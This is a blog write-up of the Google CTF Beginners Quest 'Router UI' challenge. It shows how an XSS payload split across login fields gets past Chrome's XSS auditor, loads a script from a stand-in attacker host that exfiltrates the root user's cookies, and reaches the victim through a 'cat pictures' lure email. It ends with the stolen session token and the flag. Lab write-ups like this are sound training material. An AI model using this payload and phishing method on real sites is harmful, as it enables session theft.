---
layout: post
title: 'Google CTF: Beginners Quest - Router UI'
page-id: post
tags: [write-up]
---

> Using the domain found on the hardened aluminum key, you make your way on to the OffHub router. A revolutionary device that simplifies your life. You're at the UI page, but attempting to brute force the password failed miserably. If we could find an XSS on the page then we could use it to steal the root user session token. In case you find something, try to send an email to wintermuted@googlegroups.com. If you claim your link includes cat pictures, I'm sure Wintermuted will click it. I hope Chrome's XSS filter will not block the exploit though.
>
> https://router-ui.web.ctfcompetition.com/

In this challenge, we are shown a login form and need to find a way to steal the session token from the root user. We're given a hint about finding XSS somewhere on the page, but Chrome's XSS filter makes this a bit more difficult. Once we find a way to bypass this filter, we can send off an email to the root user containing a link and hope that they'll click it. From the challenge description, if we say the link has cat pictures, there's a good chance they'll do exactly that.

You can see the XSS filter in action by inputting something like `<script>alert('XSS');</script>` in one of the fields and submitting it. You should get an `ERR_BLOCKED_BY_XSS_AUDITOR` error. If we put some legit values, let's say `user` and `password`, into the login form and submit it, we're shown a page that states

`Wrong credentials: user//password`

Something of note here is that `//` is being used to separate the username and password. We can use this to our advantage to bypass Chrome's XSS filter. In particular, we'll use the `//` to help us craft a URL. To show what I mean, go back to the login form and set the username to `http:` and the password to `example.com` and then submit it.

`Wrong credentials: http://example.com`

BOOM! We can craft ourselves a URL. This by itself isn't all that useful. But we can take advantage of this by inputting a script into this field that loads a JS file, hosted by us, that will send the user's cookie to us. The script we'll end up using looks something like this:

`<script src="https://yourwebsite.com/cookie.js"></script>`

But of course, we can't just pass that into the form, we'll trigger the XSS filter. But by splitting it between the username and password fields as we did earlier, we can execute our own scripts. Here are the values we'll be using:

`username = <script src="https:`

`password = yourwebsite.com/cookie.js"></script>`

We have a way to attack the root user, now we just need them to submit a form with these values in it. To accomplish this, we'll first need to set up a website that handles this. Then we can email the link to them in hopes they'll click it.

NOTE: The website must have an SSL certificate. An easy way to do this is to use [Heroku](https://heroku.com/) to host the website.

We only need two files for this, a `js` and `html` file. The Javascript file's only job is to redirect the user to a URL and pass along their cookies. The HTML file will contain an exact copy of the login form located on the challenges page. Our form will submit the values of the `username` and `password` fields, set to our payload above, to the login form on `https://router-ui.web.ctfcompetition.com/login`. When submitted, our script will be loaded, thus sending the user's cookies to us.

<script src="https://gist.github.com/c3bd628bb16ea4cac13fe2ec741bb109.js"></script>

<script src="https://gist.github.com/b09e02aba41c19f629cef68162f90fa4.js"></script>

Our Javascript file is sending the user to a nonexistent page, which is fine since the request will be logged, allowing us to view the cookies being passed with it.

With the website set up, all we have to do now is send an email to `wintermuted@googlegroups.com` containing a link to `https://yourwebsite.com`. To play along with the challenge description, we should also set the subject line of the email to `Cat Pictures`.

Once the email is sent off, you should receive a confirmation within a few seconds. Watch your server logs and you'll see a request was made that includes some cookies. It'll look something like

`GET /cookie.html?flag=Try%20the%20session%20cookie;%20session=Avaev8thDieM6Quauoh2TuDeaez9Weja HTTP/1.1`

Looks as if the root user had two cookies:

`flag=Try the session cookie`

`session=Avaev8thDieM6Quauoh2TuDeaez9Weja`

If we enter these cookies into our browser and navigate to `https://router-ui.web.ctfcompetition.com/`, we'll be greeted with the dashboard. On this page, the first thing that jumps out at me are the two credential fields. If we look at either one of those values, we can see it contains the flag: `CTF{Kao4pheitot7Ahmu}`.